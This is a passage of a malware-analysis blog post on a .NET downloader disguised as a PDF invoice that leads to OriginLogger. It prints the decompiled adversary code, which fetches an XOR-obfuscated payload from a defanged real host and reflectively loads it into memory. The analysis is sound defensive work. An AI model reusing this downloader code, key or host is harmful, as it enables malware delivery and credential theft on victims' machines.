<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content=".NET Downloader Leading to OriginLogger" /><meta property="og:locale" content="en" /><meta name="description" content="Earlier in January, Unit42 and Brad (@malware_traffic) posted tweets with some details on an instance of OriginLogger floating around in the wild." /><meta property="og:description" content="Earlier in January, Unit42 and Brad (@malware_traffic) posted tweets with some details on an instance of OriginLogger floating around in the wild." /><link rel="canonical" href="https://forensicitguy.github.io/net-downloader-originlogger/" /><meta property="og:url" content="https://forensicitguy.github.io/net-downloader-originlogger/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-07T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content=".NET Downloader Leading to OriginLogger" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-07T00:00:00+00:00","datePublished":"2023-01-07T00:00:00+00:00","description":"Earlier in January, Unit42 and Brad (@malware_traffic) posted tweets with some details on an instance of OriginLogger floating around in the wild.","headline":".NET Downloader Leading to OriginLogger","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/net-downloader-originlogger/"},"url":"https://forensicitguy.github.io/net-downloader-originlogger/"}</script><title>.NET Downloader Leading to OriginLogger | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>.NET Downloader Leading to OriginLogger</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>.NET Downloader Leading to OriginLogger</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1673049600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-01-07 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1480 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>Earlier in January, Unit42 and Brad (<a href="https://twitter.com/malware_traffic">@malware_traffic</a>) posted tweets with some details on an instance of OriginLogger floating around in the wild.</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr"><a href="https://twitter.com/hashtag/pcap?src=hash&amp;ref_src=twsrc%5Etfw">#pcap</a> of the infection traffic, sanitized copy of the email, and with the associated malware are available at: <a href="https://t.co/B1wo9XjSQV">https://t.co/B1wo9XjSQV</a> <a href="https://t.co/KoxMLd8K0e">pic.twitter.com/KoxMLd8K0e</a></p>&mdash; Brad (@malware_traffic) <a href="https://twitter.com/malware_traffic/status/1611464921614811136?ref_src=twsrc%5Etfw">January 6, 2023</a></blockquote><script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>In this post I want to take a look at the first stage of the malware observed by Brad and shared in his blog post alongside the relevant PCAP. If you want to follow along, the files are available <a href="https://www.malware-traffic-analysis.net/2023/01/05/index.html">here</a>.</p><h2 id="triaging-the-malware"><span class="mr-2">Triaging the malware</span><a href="#triaging-the-malware" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can perform our initial triage on <code class="language-plaintext highlighter-rouge">Payment Copy_Chase Bank_Pdf.exe</code> using Detect-It-Easy. I wanted to use the GUI version this time around, and it gives some more information.</p><p><img data-src="/assets/images/net-downloader-originlogger/detect-it-easy-initial-view.png" alt="Detect-It-Easy initial view" data-proofer-ignore></p><p>Immediately we can observe that the file is an EXE developed using the .NET Framework. The date/time stamp is really far into the future so I’d hazard a guess that some of the binary properties have been modified for evasion.</p><p><img data-src="/assets/images/net-downloader-originlogger/detect-it-easy-entropy-view.png" alt="Detect-It-Easy entropy view" data-proofer-ignore></p><p>Looking into the entropy measurements, there doesn’t appear to be any compression or packing involved. All of the entropy measurements are between 0-5, indicating more natural language or programming instructions. Compression would approach 6-7 while encryption would be in the high 7.9 measurements.</p><h2 id="decompiling-and-analyzing-the-exe"><span class="mr-2">Decompiling and analyzing the EXE</span><a href="#decompiling-and-analyzing-the-exe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can easily decompile the EXE using <code class="language-plaintext highlighter-rouge">ilspycmd</code> and inspect the code in VSCode.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/originlogger$</span><span class="w"> </span><span class="nb">mkdir </span>src
<span class="gp">remnux@remnux:~/cases/originlogger$</span><span class="w"> </span>ilspycmd <span class="nt">-p</span> <span class="nt">-o</span> src/ Payment<span class="se">\ </span>Copy_Chase<span class="se">\ </span>Bank_Pdf.exe 
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/originlogger$</span><span class="w"> </span>tree <span class="nt">-a</span>
<span class="c">.
</span><span class="go">├── Payment Copy_Chase Bank_Pdf.exe
└── src
    ├── app.ico
    ├── Mvqdwnrv.csproj
    ├── Properties
    │   └── AssemblyInfo.cs
    └── WindowsFormsApp50
        ├── Form1.cs
        ├── Hyper.cs
        └── Program.cs

3 directories, 7 files
</span></pre></table></code></div></div><p>I like decompiling using <code class="language-plaintext highlighter-rouge">ilspycmd -p</code> to an output folder because it also gives me the application icon for extra context. In this case, the icon is an Adobe-themed document icon to help the malware masquerade as a PDF file.</p><p><img data-src="/assets/images/net-downloader-originlogger/adobe-icon-malware.png" alt="Adobe icon used by malware" data-proofer-ignore></p><h3 id="visual-studio-boilerplate-code"><span class="mr-2">Visual Studio boilerplate code</span><a href="#visual-studio-boilerplate-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>This particular .NET program looks fairly simple and was likely a quick Visual Studio project using the “Windows Forms” template project. I’m basing the simplicity on the number of code files and the template part based on the folder/namespace name <code class="language-plaintext highlighter-rouge">WindowsFormsApp50</code>. In programs this simple we can usually find an entry point within <code class="language-plaintext highlighter-rouge">Program.cs</code>.</p><div file="Program.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Program.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Windows.Forms</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">WindowsFormsApp50</span>
<span class="p">{</span>
	<span class="k">internal</span> <span class="k">class</span> <span class="nc">Program</span>
	<span class="p">{</span>
		<span class="p">[</span><span class="n">STAThread</span><span class="p">]</span>
		<span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span>
		<span class="p">{</span>
			<span class="n">Application</span><span class="p">.</span><span class="nf">EnableVisualStyles</span><span class="p">();</span>
			<span class="n">Application</span><span class="p">.</span><span class="nf">SetCompatibleTextRenderingDefault</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
			<span class="n">Application</span><span class="p">.</span><span class="nf">Run</span><span class="p">((</span><span class="n">Form</span><span class="p">)(</span><span class="kt">object</span><span class="p">)</span><span class="k">new</span> <span class="nf">Form1</span><span class="p">());</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The entirety of <code class="language-plaintext highlighter-rouge">Program.cs</code> is pretty small in this case. Its sole job is to kick off the application with an instance of the <code class="language-plaintext highlighter-rouge">Form1</code> class. This is pretty basic boilerplate code generated by Visual Studio when creating a Windows Forms app. To follow application flow, we can jump into <code class="language-plaintext highlighter-rouge">Form1.cs</code></p><div file="Form1.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Form1.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="k">public</span> <span class="nf">Form1</span><span class="p">()</span>
    <span class="p">:</span> <span class="k">this</span><span class="p">()</span>
<span class="p">{</span>
    <span class="nf">InitializeComponent</span><span class="p">();</span>
    <span class="nf">Socker</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The constructor for Form1 is really simple, it calls <code class="language-plaintext highlighter-rouge">InitializeComponent()</code> to configure the visual controls on the Windows Form and then <code class="language-plaintext highlighter-rouge">Socker()</code> to perform more actions after. The <code class="language-plaintext highlighter-rouge">InitializeComponent()</code> code is likely partially generated by Visual Studio with some additions from the adversary. <code class="language-plaintext highlighter-rouge">Socker()</code> is not part of the VS boilerplate code, so it’s going to be adversary-provided.</p><div file="Form1.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Form1.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">void</span> <span class="nf">InitializeComponent</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">richTextBox1</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">RichTextBox</span><span class="p">();</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">SuspendLayout</span><span class="p">();</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Dock</span><span class="p">((</span><span class="n">DockStyle</span><span class="p">)</span><span class="m">5</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Location</span><span class="p">(</span><span class="k">new</span> <span class="nf">Point</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">));</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Name</span><span class="p">(</span><span class="s">"richTextBox1"</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Size</span><span class="p">(</span><span class="k">new</span> <span class="nf">Size</span><span class="p">(</span><span class="m">800</span><span class="p">,</span> <span class="m">450</span><span class="p">));</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_TabIndex</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Text</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
    <span class="p">((</span><span class="n">ContainerControl</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">set_AutoScaleDimensions</span><span class="p">(</span><span class="k">new</span> <span class="nf">SizeF</span><span class="p">(</span><span class="m">11f</span><span class="p">,</span> <span class="m">24f</span><span class="p">));</span>
    <span class="p">((</span><span class="n">ContainerControl</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">set_AutoScaleMode</span><span class="p">((</span><span class="n">AutoScaleMode</span><span class="p">)</span><span class="m">1</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Form</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">set_ClientSize</span><span class="p">(</span><span class="k">new</span> <span class="nf">Size</span><span class="p">(</span><span class="m">800</span><span class="p">,</span> <span class="m">450</span><span class="p">));</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">get_Controls</span><span class="p">().</span><span class="nf">Add</span><span class="p">((</span><span class="n">Control</span><span class="p">)(</span><span class="kt">object</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">set_Name</span><span class="p">(</span><span class="s">"Form1"</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">set_Text</span><span class="p">(</span><span class="s">"Form1"</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">ResumeLayout</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This <code class="language-plaintext highlighter-rouge">InitializeComponent()</code> function is pretty straightforward and is typical of the auto-generated code from VS when you create and manipulate controls on a form in the IDE. The app has a RichTextBox control inside a container.</p><h3 id="adversary-code"><span class="mr-2">Adversary code</span><a href="#adversary-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Now we can dive into the <code class="language-plaintext highlighter-rouge">Socker()</code> function.</p><div file="Form1.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Form1.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">void</span> <span class="nf">Socker</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">try</span>
    <span class="p">{</span>
        <span class="nf">Trial</span><span class="p">();</span>
        <span class="nf">Void</span><span class="p">();</span>
        <span class="nf">Lion</span><span class="p">();</span>
        <span class="nf">Ursa</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">catch</span> <span class="p">(</span><span class="n">Exception</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="p">((</span><span class="n">Form</span><span class="p">)</span><span class="k">this</span><span class="p">).</span><span class="nf">Close</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The function branches off into four additional functions. If these functions return an exception for some reason, the adversary code “swallows” the error and closes Form1 to end the program execution.</p><p>The first branching function is <code class="language-plaintext highlighter-rouge">Trial()</code>, which branches into an additional class named <code class="language-plaintext highlighter-rouge">Hyper.cs</code>.</p><div file="Form1.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Form1.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">void</span> <span class="nf">Trial</span><span class="p">()</span>
<span class="p">{</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Text</span><span class="p">(</span><span class="s">"Gdbtshcw.Sdnceyzqa Vqyhbeqthicxedwtrnxrbzcq"</span><span class="p">);</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Tag</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="n">Hyper</span><span class="p">.</span><span class="nf">Array</span><span class="p">());</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">set_Text()</code> portion sets some randomized string to the text property of the RichTextBox in the form. It also sets a “tag” for the text box control to the output of <code class="language-plaintext highlighter-rouge">Hyper.Array()</code>. So let’s take a look at <code class="language-plaintext highlighter-rouge">Hyper.cs</code>.</p><div file="Hyper.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Hyper.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="k">internal</span> <span class="k">class</span> <span class="nc">Hyper</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">GetBuffer</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nf">Avrql</span><span class="p">(</span><span class="s">"hxxp://savory.com[.]bd/sav/Ztvfo.png"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">Avrql</span><span class="p">(</span><span class="kt">string</span> <span class="n">url</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">WebResponse</span> <span class="n">response</span> <span class="p">=</span> <span class="p">((</span><span class="n">WebRequest</span><span class="p">)(</span><span class="n">HttpWebRequest</span><span class="p">)</span><span class="n">WebRequest</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="n">url</span><span class="p">)).</span><span class="nf">GetResponse</span><span class="p">();</span>
        <span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">();</span>
        <span class="n">response</span><span class="p">.</span><span class="nf">GetResponseStream</span><span class="p">().</span><span class="nf">CopyTo</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">memoryStream</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">internal</span> <span class="k">static</span> <span class="kt">byte</span><span class="p">[]</span> <span class="nf">Array</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="p">&lt;</span> <span class="m">10</span><span class="p">;</span> <span class="n">i</span><span class="p">++)</span>
        <span class="p">{</span>
            <span class="k">try</span>
            <span class="p">{</span>
                <span class="kt">byte</span><span class="p">[]</span> <span class="n">buffer</span> <span class="p">=</span> <span class="nf">GetBuffer</span><span class="p">();</span>
                <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="s">"Sfhdjkpkowgnpcgoshb"</span><span class="p">);</span>
                <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">&gt;</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">byte</span><span class="p">&gt;();</span>
                <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">j</span> <span class="p">&lt;</span> <span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="n">j</span><span class="p">++)</span>
                <span class="p">{</span>
                    <span class="n">list</span><span class="p">.</span><span class="nf">Add</span><span class="p">((</span><span class="kt">byte</span><span class="p">)(</span><span class="n">bytes</span><span class="p">[</span><span class="n">j</span> <span class="p">%</span> <span class="n">bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">]</span> <span class="p">^</span> <span class="n">buffer</span><span class="p">[</span><span class="n">j</span><span class="p">]));</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="n">list</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">();</span>
            <span class="p">}</span>
            <span class="k">catch</span>
            <span class="p">{</span>
                <span class="n">Thread</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="n">TimeSpan</span><span class="p">.</span><span class="nf">FromSeconds</span><span class="p">(</span><span class="m">10.0</span><span class="p">));</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>It doesn’t look like it, but the entire <code class="language-plaintext highlighter-rouge">Hyper.cs</code> file is still pretty small, with just a few lines of code to download a blob of data from a remote site (<code class="language-plaintext highlighter-rouge">GetBuffer()</code> and <code class="language-plaintext highlighter-rouge">Avrql()</code>), deobfuscate it by XORing it with the bytes of <code class="language-plaintext highlighter-rouge">Sfhdjkpkowgnpcgoshb</code>, and return the deobfuscated bytes. Presumably the deobfuscated blob will be a second .NET program or DLL. Since Brad included captured network traffic alongside this sample we can manually get the downloaded blob and deobfuscate it shortly.</p><p>So what does the program do with the downloaded bytes? Most of the time this sort of malware will perform some form of reflective load or injection. The <code class="language-plaintext highlighter-rouge">using</code> statements at the beginning of Form1 didn’t include any references to Interop classes, so injection is likely out. I assume from this point they’re going to perform a reflective load. We can see some code to perform a reflective load in the Form1 function <code class="language-plaintext highlighter-rouge">Void()</code>.</p><div file="Form1.cs" class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="Form1.cs"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">void</span> <span class="nf">Void</span><span class="p">()</span>
<span class="p">{</span>
    <span class="p">((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">set_Tag</span><span class="p">((</span><span class="kt">object</span><span class="p">)</span><span class="n">Thread</span><span class="p">.</span><span class="nf">GetDomain</span><span class="p">().</span><span class="nf">Load</span><span class="p">((</span><span class="kt">byte</span><span class="p">[])((</span><span class="n">Control</span><span class="p">)</span><span class="n">richTextBox1</span><span class="p">).</span><span class="nf">get_Tag</span><span class="p">()));</span>
<span class="p">}</span>
